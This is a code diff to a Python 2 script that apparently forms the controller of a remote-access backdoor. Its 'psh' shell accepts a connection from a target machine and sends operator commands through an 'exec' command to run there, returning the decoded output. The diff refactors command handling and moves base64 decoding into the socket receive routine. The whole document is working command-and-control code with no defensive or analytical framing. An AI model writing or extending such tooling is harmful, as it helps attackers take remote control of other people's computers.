@@ -27,6 +27,7 @@ def get_args():
 
 
 def ctrl_shell_server(s, PORT):
+    cmds = ['exit', 'help', 'exec']
     print '[+] ({}) Entering control shell'.format(datetime.now())
     conn, addr = s.accept()
     print 'Welcome to psh, the perennial shell!'
@@ -34,17 +35,17 @@ def ctrl_shell_server(s, PORT):
     while True:
         try:
             inp = raw_input('psh > ')
-            if inp == 'exit':
-                break
-            elif inp == '':
+            if inp == '':
                 continue
-            elif inp.startswith('help'):
-                print 'Commands:\n  exec'
-                print '\ntip: run `command -h\' to get the command\'s help'
-            elif inp.startswith('exec'):
+            elif inp == cmds[0]:
+                break
+            elif inp.startswith(cmds[1]):
+                print 'Commands:'
+                for cmd in cmds:
+                    print '  {}'.format(cmd)
+            elif inp.startswith(cmds[2]):
                 if re.search('^exec ("[^"]+"\ )+$', inp + ' '):
-                    response = ctrl_shell_exec(conn, inp)
-                    print response
+                    print ctrl_shell_exec(conn, inp)
                 else:
                     print 'Execute commands on target.'
                     print 'usage: exec "cmd1" ["cmd2" "cmd3" ...]'
@@ -58,8 +59,7 @@ def ctrl_shell_server(s, PORT):
 
 def ctrl_shell_exec(conn, inp):
     socksend(conn, inp)
-    response = base64.b64decode(sockrecv(conn))
-    return response
+    return sockrecv(conn)
 
 
 def socksend(s, msg):
@@ -101,7 +101,7 @@ def sockrecv(s):
             raise socket.error('socket connection broken')
         chunks.append(chunk)
         bytes_recvd += len(chunk)
-    return ''.join(chunks)
+    return base64.b64decode(''.join(chunks))
 
 
 def main():
